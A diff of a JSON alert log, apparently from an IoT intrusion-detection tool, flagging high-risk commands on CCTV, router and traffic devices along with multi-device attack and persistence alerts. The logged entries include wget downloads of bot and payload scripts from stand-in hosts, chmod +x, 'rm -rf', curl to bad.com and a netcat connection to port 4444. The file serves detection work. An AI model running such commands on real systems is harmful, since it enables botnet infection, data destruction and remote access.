@@ -3,62 +3,86 @@
     "type": "HIGH_RISK_COMMAND",
     "device": "cctv",
     "command": "wget http://evil.com/bot.sh",
-    "timestamp": "2026-02-13 03:36:33.125508"
+    "timestamp": "2026-02-13 07:45:41.817430"
   },
   {
     "type": "HIGH_RISK_COMMAND",
     "device": "cctv",
     "command": "chmod +x bot",
-    "timestamp": "2026-02-13 03:36:33.125660"
+    "timestamp": "2026-02-13 07:45:41.817658"
   },
   {
     "type": "HIGH_RISK_COMMAND",
     "device": "cctv",
     "command": "rm -rf",
-    "timestamp": "2026-02-13 03:36:33.125693"
+    "timestamp": "2026-02-13 07:45:41.817720"
   },
   {
     "type": "HIGH_RISK_COMMAND",
     "device": "cctv",
     "command": "wget http://malicious.com/payload.sh",
-    "timestamp": "2026-02-13 03:36:33.125816"
+    "timestamp": "2026-02-13 07:45:41.818059"
   },
   {
     "type": "HIGH_RISK_COMMAND",
     "device": "cctv",
     "command": "curl http://bad.com",
-    "timestamp": "2026-02-13 03:36:33.125846"
+    "timestamp": "2026-02-13 07:45:41.818126"
   },
   {
     "type": "HIGH_RISK_COMMAND",
     "device": "cctv",
     "command": "nc 1.2.3.4 4444",
-    "timestamp": "2026-02-13 03:36:33.125873"
+    "timestamp": "2026-02-13 07:45:41.818190"
+  },
+  {
+    "type": "HIGH_RISK_COMMAND",
+    "device": "cctv",
+    "command": "wget http://malicious.site/bot.sh",
+    "timestamp": "2026-02-13 07:45:41.818503"
+  },
+  {
+    "type": "HIGH_RISK_COMMAND",
+    "device": "cctv",
+    "command": "chmod +x bot.sh",
+    "timestamp": "2026-02-13 07:45:41.818674"
+  },
+  {
+    "type": "HIGH_RISK_COMMAND",
+    "device": "cctv",
+    "command": "wget http://malicious.sit/payload.sh",
+    "timestamp": "2026-02-13 07:45:41.819078"
+  },
+  {
+    "type": "HIGH_RISK_COMMAND",
+    "device": "router",
+    "command": "wget http://malicious.sit/payload.sh",
+    "timestamp": "2026-02-13 07:45:41.820507"
   },
   {
     "type": "HIGH_RISK_COMMAND",
     "device": "traffic",
     "command": "chmod +x",
-    "timestamp": "2026-02-13 03:36:33.127297"
+    "timestamp": "2026-02-13 07:45:41.829629"
   },
   {
     "type": "MULTI_DEVICE_ATTACK",
     "devices": [
-      "router",
-      "cctv",
       "traffic",
-      "sensor"
+      "sensor",
+      "router",
+      "cctv"
     ],
-    "timestamp": "2026-02-13 03:36:33.127438"
+    "timestamp": "2026-02-13 07:45:41.830509"
   },
   {
     "type": "PERSISTENCE_BEHAVIOR",
-    "command_count": 24,
-    "timestamp": "2026-02-13 03:36:33.127454"
+    "command_count": 35,
+    "timestamp": "2026-02-13 07:45:41.830569"
   },
   {
     "type": "HIGH_THREAT_SCORE",
     "score": 80,
-    "timestamp": "2026-02-13 03:36:33.127467"
+    "timestamp": "2026-02-13 07:45:41.830590"
   }
 ]
